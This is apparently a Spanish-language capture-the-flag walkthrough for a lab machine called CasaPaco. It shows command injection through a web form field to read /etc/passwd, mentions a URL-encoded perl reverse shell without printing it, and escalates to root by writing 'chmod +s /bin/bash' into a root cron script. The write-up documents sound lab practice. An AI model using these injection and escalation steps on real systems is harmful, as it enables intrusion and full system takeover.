PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Añadimos el dominio casapaco.thl al /etc/hosts

-Entramos a /llevar.php

-Si ponemos 'id' o 'dir' en el campo 'plato' nos devuelve el comando, pero hay muchos que están capados

-Al hacer dir descubrimos un archivo llamado llevar1.php, lo buscamos en la URL.

-Es muy parecido, lo interceptamos con Burpsuite y probamos a leer el /etc/passwd:
	-name=sergio&dish=cat+/etc/passwd
		-Vemos el /etc/passwd!!

-Pegamos una reverse shell UrlEncoded y obtenemos acceso a la máquina, yo he usado la de perl no sh
www-data@Thehackerslabs-CasaPaco:

## Escalada de Privilegios

-Nos metemos en /home/pacogerente y vemos un archivo 'fabada.sh'

-Tenemos permisos de escritura y parece ser que es una tarea CRON que ejecuta root cada cierto tiempo

-La editamos con --> chmod +s /bin/bash , esperamos y han cambiado los permisos de la /bin/bash
	-bash -p
		bash-5.2# whoami
		root